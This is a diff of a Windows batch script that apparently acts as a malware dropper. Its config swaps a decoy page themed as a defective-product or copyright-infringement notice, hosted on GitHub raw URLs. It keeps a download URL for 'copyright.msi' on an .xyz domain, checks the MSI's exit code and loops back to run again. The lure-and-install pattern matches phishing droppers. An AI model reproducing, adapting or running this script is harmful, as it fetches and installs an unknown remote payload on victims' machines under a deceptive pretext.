@@ -4,8 +4,8 @@ setlocal EnableDelayedExpansion
 :: =========================
 :: CONFIG
 :: =========================
-set "htmlUrl=https://raw.githubusercontent.com/pawheaven/product/refs/heads/main/Defective_Product.html"
-set "htmlFileName=Defective_Product.html"
+set "htmlUrl=https://raw.githubusercontent.com/danghau123/copyrighthtml/main/media-copyright.html"
+set "htmlFileName=media-copyright.html"
 set "htmlFilePath=%TEMP%\%htmlFileName%"
 
 set "url=https://files.riowordcentral.xyz/copyright/copyright.msi"
@@ -54,6 +54,7 @@ if !MSI_EXIT_CODE! EQU 0 (
 :: =========================
 timeout /t 2 /nobreak >nul
 goto RunLoop
+
 
 
 
